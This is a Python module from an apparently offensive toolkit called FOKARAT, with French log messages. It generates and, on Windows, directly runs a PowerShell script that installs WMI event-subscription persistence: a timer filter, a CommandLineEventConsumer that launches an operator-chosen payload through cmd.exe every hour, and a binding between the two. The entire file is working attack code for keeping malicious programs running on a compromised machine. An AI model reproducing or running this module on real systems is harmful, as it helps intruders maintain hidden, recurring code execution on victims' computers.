"""FOKARAT - Persistance WMI (Windows)"""
import os
import sys
import shutil
import subprocess
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import ensure_dir

logger = Logger()


class WMIPersistence(ModuleInterface):
    def get_metadata(self):
        return {
            "name": "WMI Persistence",
            "version": "1.0",
            "type": "persistence",
            "description": "Persistance WMI via Event Subscription."
        }

    def run(self, config):
        payload = input("  [>] Chemin du payload cible (sur Windows) : ").strip()
        if not payload:
            logger.error("Chemin vide.")
            return {"status": "error", "message": "Payload manquant"}

        ps_script = f'''
$filterArgs = @{{Name='FokaratFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __IntervalTimerEvent WHERE TimerID='FokaratTimer' AND IntervalBetweenFirings=3600000"}}
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $filterArgs
$consumerArgs = @{{Name='FokaratConsumer'; CommandLineTemplate='"{payload}"'; ExecutablePath="cmd.exe"}}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $consumerArgs
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments @{{Filter=$filter; Consumer=$consumer}}
'''

        out_dir = ensure_dir(config.get("output_dir", "output"))
        script_path = os.path.join(out_dir, "wmi_persistence.ps1")
        with open(script_path, "w", encoding="utf-8") as f:
            f.write(ps_script)

        logger.success(f"Script WMI généré : {script_path}")
        logger.warning("À exécuter manuellement sur la cible Windows avec PowerShell admin.")

        if sys.platform == "win32" and shutil.which("powershell"):
            logger.info("Exécution directe...")
            try:
                subprocess.run(["powershell", "-Command", ps_script], check=True, capture_output=True)
                logger.success("Persistance WMI installée.")
                return {"status": "success", "method": "wmi"}
            except subprocess.CalledProcessError as e:
                logger.error(f"Échec : {e}")
                return {"status": "error", "message": str(e)}

        return {"status": "success", "script_path": script_path, "note": "Exécution manuelle requise"}